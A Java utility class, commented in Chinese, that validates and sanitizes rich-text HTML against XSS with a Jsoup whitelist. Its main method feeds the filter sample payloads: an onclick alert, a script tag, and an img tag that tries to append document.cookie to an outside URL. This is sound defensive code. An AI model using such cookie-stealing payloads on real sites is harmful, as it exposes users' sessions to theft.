package com.im.common.util;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.safety.Whitelist;

/**
 * 验证文本中是否存在XSS恶意数据
 *
 * @author Barry
 * @date 2018/5/12
 */
public final class XssUtil {
    private XssUtil() {
    }

    /**
     * 使用自带的basicWithImages 白名单
     * 允许的便签有a,b,blockquote,br,cite,code,dd,dl,dt,em,i,li,ol,p,pre,q,small,span,
     * strike,strong,sub,sup,u,ul,img
     * 以及a标签的href,img标签的src,align,alt,height,width,title属性
     */
    private static final Whitelist WHITE_LIST = Whitelist.basicWithImages();

    /**
     * 配置过滤化参数,不对代码进行格式化
     */
    private static final Document.OutputSettings OUTPUT_SETTINGS = new Document.OutputSettings().prettyPrint(false);

    static {
        // 富文本编辑时一些样式是使用style来进行实现的
        // 比如红色字体 style="color:red;"
        // 所以需要给所有标签添加style属性
        WHITE_LIST.addAttributes(":all", "style");
    }

    /**
     * 过滤掉字符串中恶意代码,如<a href="http://www.baidu.com/a" onclick="alert(1);">sss</a><script>alert(0);</script>sss
     * 将会被过滤成<a href="http://www.baidu.com/a" rel="nofollow">sss</a>sss
     *
     * @param content 要过滤的内容
     * @return 过滤后的内容
     */
    public static String clean(String content) {
        if (content == null) {
            return null;
        }
        return Jsoup.clean(content, "", WHITE_LIST, OUTPUT_SETTINGS);
    }

    /**
     * 检查内容中是否存在非法XSS代码
     *
     * @param content 要检查的内容
     * @return true:合法; false:非法;
     */
    public static boolean isValid(String content) {
        if (content == null) {
            return true;
        }
        return Jsoup.isValid(content, WHITE_LIST);
    }

    public static void main(String[] args) {
        String text1 = "<a href=\"http://www.baidu.com/a\" onclick=\"alert(1);\">sss</a><script>alert(0);</script>sss";
        System.out.println(isValid(text1));
        System.out.println(clean(text1));

        String text2 = "<img src='http://www.baidu.com?__sd_sdf=' + document.cookie/>";
        System.out.println(isValid(text2));
        System.out.println(clean(text2));
    }
}
